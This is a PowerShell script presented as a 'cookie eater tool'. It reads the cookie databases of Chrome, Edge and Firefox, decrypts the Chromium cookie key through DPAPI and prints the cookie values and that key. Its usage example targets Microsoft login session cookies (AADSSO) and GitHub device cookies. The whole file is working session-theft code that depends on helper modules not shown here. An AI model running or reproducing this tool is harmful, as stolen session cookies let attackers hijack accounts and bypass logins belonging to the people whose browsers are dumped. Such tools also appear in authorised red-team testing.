<#
.SYNOPSIS
    A cookie eater tool.
.DESCRIPTION
    Dump the cookie values of the main browsers according to the preferences of the user.
.PARAMETER Dump
    Specifies the operation to dump the cookie values according to the values of the other parameters.
.PARAMETER Browser
    Specifies the browser to take cookies. Currently <Chrome|Firefox|Edge>.
.PARAMETER Domain
    Specifies which domains the user wants to catch the related cookies.
.PARAMETER CookieName
    Specifies which particular cookies, for specified domains, must be caught.
.EXAMPLE
    C:\PS> 
    .\cookey.ps1 -Dump -Browser Chrome -Domain .login.microsoftonline.com,github.com -CookieName AADSSO,_device_id
.NOTES
    Author: D3vil0per
    Date:   June 24, 2021    
#>
Param(
        [Parameter()][switch]$Dump,
        [Parameter()][switch]$Import,
        [Parameter()][string]$Browser,
        [Parameter()][string[]]$Domain,
        [Parameter()][string[]]$CookieName
)


Add-Type -Assembly System.Security

if((gwmi win32_operatingsystem | select osarchitecture).osarchitecture -eq "64-bit")
{
    Add-Type -Path "$PSScriptRoot\x64\System.Data.SQLite.dll"
}
else
{
    Add-Type -Path "$PSScriptRoot\x86\System.Data.SQLite.dll"
}

Import-Module $PSScriptRoot\lib\Invoke-SqliteQuery
Import-Module $PSScriptRoot\lib\banner
Import-Module $PSScriptRoot\lib\datatype
Import-Module $PSScriptRoot\lib\modules

Show-Banner

$object = New-Browser

    if($Dump){
        
        switch ($Browser) {
        {($_ -eq $chromeName) -or ($_ -eq $edgeName)} {
            
            $object.DBTable = "cookies"
            $object.hostcolumn = "host_key"
            $object.valuecolumn = "encrypted_value"
            $object.requireEncryption = $true

            if ($_ -eq $chromeName) {
                $object.decKey = DPAPIDecryptKey $chromeKeyPath
                $object.Database = $chromeCookiePath
            }
            elseif ($_ -eq $edgeName) {
                $object.decKey = DPAPIDecryptKey $edgeKeyPath
                $object.Database = $edgeCookiePath
            }
          }
        $firefoxName {
            $object.decKey = $null
            $object.Database = $firefoxCookiePath
            $object.DBTable = "moz_cookies"
            $object.hostcolumn = "host"
            $object.valuecolumn = "value"
            $object.requireEncryption = $false
          }
        }
        $query = "SELECT $($object.hostcolumn), name, $($object.valuecolumn), path FROM $($object.DBTable)"
        
        if ($($PSBoundParameters.ContainsKey('Domain'))) {
            foreach ($dom in $Domain) 
            {
                if ($($PSBoundParameters.ContainsKey('CookieName'))) {
                    foreach ($element in $CookieName) 
                    {
                        #CAST object[] IMPORTANT!! Otherwise the variable does not display the information
                        [object[]]$encAll = Invoke-SqliteQuery -DataSource $($object.Database) -Query $query | Where-Object {$_.$($object.hostcolumn) -eq $dom -and $_.name -match $element}
                        PrintResult $object $encAll
                    }
                }
                else {                    
                    [object[]]$encAll = Invoke-SqliteQuery -DataSource $($object.Database) -Query $query | Where-Object {$_.$($object.hostcolumn) -eq $dom}
                    PrintResult $object $encAll
                }             
            }
        }
        else {
            [object[]]$encAll = Invoke-SqliteQuery -DataSource $($object.Database) -Query $query
            PrintResult $object $encAll
        }     
        if ($($object.requireEncryption))
        {
            Write-Host "DECRYPTION KEY [HEX]: " -ForegroundColor Green -NoNewline; Write-Host "$($object.decKey)" -ForegroundColor Yellow
            Write-Host ""
            Write-Host ""
        }
    }

    if($Import){
        Write-Host "WORK IN PROGRESS"
    }